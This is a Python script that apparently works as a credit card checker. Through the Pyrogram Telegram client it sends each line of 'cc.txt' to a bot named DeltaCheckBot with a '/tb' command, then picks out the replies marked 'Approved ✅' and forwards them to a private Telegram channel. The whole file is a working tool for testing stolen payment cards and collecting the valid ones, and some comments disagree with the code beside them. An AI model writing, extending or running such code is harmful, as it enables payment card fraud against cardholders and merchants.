import asyncio
from pyrogram import Client, filters
from config import API_ID, API_HASH, SESSION

app = Client(
     name='t',
     api_id=API_ID,
     api_hash=API_HASH,
     session_string=str(SESSION),
     in_memory=True,
)

done = 0
total_cc_count = sum(1 for line in open('cc.txt'))

# Replace '123456789' with the chat ID of your private channel
channel_chat_id = -1001926973349

@app.on_message(filters.regex(r'^.*$') & filters.private)
async def handle_message(app, message):
    if message.chat.username == 'DeltaCheckBot':
        if 'wait' in message.text or 'Waiting' in message.text:
            return

        print(message.text.replace("`", ""))
        print()

        # Check if the message contains "Approved ✅"
        if 'Approved ✅' in message.text:
            edited_message = message.text.replace("tg://resolve?domain=deltachk", "")
            await forward_message_to_channel(edited_message)

            # If you want to edit the message sent by the bot:
            await message.edit(edited_message)

async def send_message_to_bot(cc):
    global done
    cc_without_destination = cc.replace("tg://resolve?domain=deltachk", "")
    await app.send_message('DeltaCheckBot', f'/tb {cc_without_destination}')
    done += 1
    print(cc_without_destination)

    if done == total_cc_count:
        await app.stop()
    
    await asyncio.sleep(21)  # Introduce a 40-second delay

async def forward_message_to_channel(message_text):
    # Forward the entire message text to the specified private channel
    await app.send_message(channel_chat_id, message_text)

async def main():
    with open('cc.txt', 'r') as file:
        for line in file:
            cc = line.strip()
            await send_message_to_bot(cc)
            if done == total_cc_count:
                await asyncio.sleep(10)
                continue

async def start_app():
    await app.start()
    await main()

asyncio.get_event_loop().run_until_complete(start_app())